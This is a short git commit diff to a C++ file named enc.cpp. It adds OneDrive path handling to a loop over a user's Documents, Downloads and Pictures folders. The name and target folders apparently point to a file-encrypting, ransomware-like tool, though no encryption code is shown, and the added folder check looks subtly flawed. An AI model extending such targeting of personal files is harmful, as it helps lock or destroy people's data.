9084f84c0345c72c16c6a833a79e668b7e9ca19f
ng0cph0ng <fogsbuddha@gmail.com>
2024-05-13 20:58:47 +0700

    Update enc.cpp

--- src/enc.cpp
+++ src/enc.cpp
@@ -12,13 +12,22 @@ int main()
 
         std::string username = getCurrentUsername();
         std::string path = "C:\\Users\\" + username + "\\";
+        std::string OneDrivePath = path + "OneDrive" + "\\";
+        std::string folderPath;
 
         // Các thư mục cần xem
         std::vector<std::string> folders = {"Documents", "Downloads", "Pictures"};
 
         for (const auto &folder : folders)
         {
-            std::string folderPath = path + folder + "\\";
+            if (fs::exists(OneDrivePath) && fs::is_directory(OneDrivePath) && fs::exists(folder) && fs::is_directory(folder))
+            {
+                folderPath = OneDrivePath + folder + "\\";
+            }
+            else
+            {
+                folderPath = path + folder + "\\";
+            }
 
             // Liệt kê các tệp và thư mục trong thư mục hiện tại
             std::vector<FileItem> items = listFilesAndDirectories(folderPath);
